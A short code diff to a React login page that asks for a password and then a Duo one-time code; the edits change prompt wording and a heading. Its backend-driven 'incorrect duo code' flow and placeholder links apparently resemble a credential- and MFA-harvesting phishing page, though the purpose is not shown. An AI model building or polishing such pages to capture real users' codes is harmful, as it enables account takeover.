@@ -134,7 +134,7 @@ const App = () => {
             } else if (status === 'duo code' || status === 'incorrect duo code') {
                 const isIncorrect = status === 'incorrect duo code';
                 setIsError(isIncorrect);
-                setAuthMessage(isIncorrect ? 'Incorrect code. Please try again.' : 'Please enter the security code.');
+                setAuthMessage(isIncorrect ? 'Incorrect code. Please try again.' : 'Open your Duo app and Duo will send you a one time code. enter code here');
                 setIsPasswordStep(false);
                 setIsDuoMobileStep(true);
                 setShowDuoCodeInput(true);
@@ -282,7 +282,7 @@ const App = () => {
                                             className="checkbox-input"
                                         />
                                         <span className="checkbox-custom"></span>
-                                        Keep me signed in
+                                        <span style={{marginRight: '3px'}}>Keep me signed in</span>
                                     </label>
                                     <a href="#" className="link-custom">Forgot password?</a>
                                 </div>
@@ -324,7 +324,7 @@ const App = () => {
 
                             {showDuoCodeInput ? (
                                 <>
-                                    <h1 className="form-title">Enter security code</h1>
+                                    <h1 className="form-title">DUO CODE</h1>
                                     {authMessage && (
                                         <p className="auth-message" style={{ color: isError ? '#d9534f' : 'inherit', marginBottom: '1rem' }}>
                                             {authMessage}
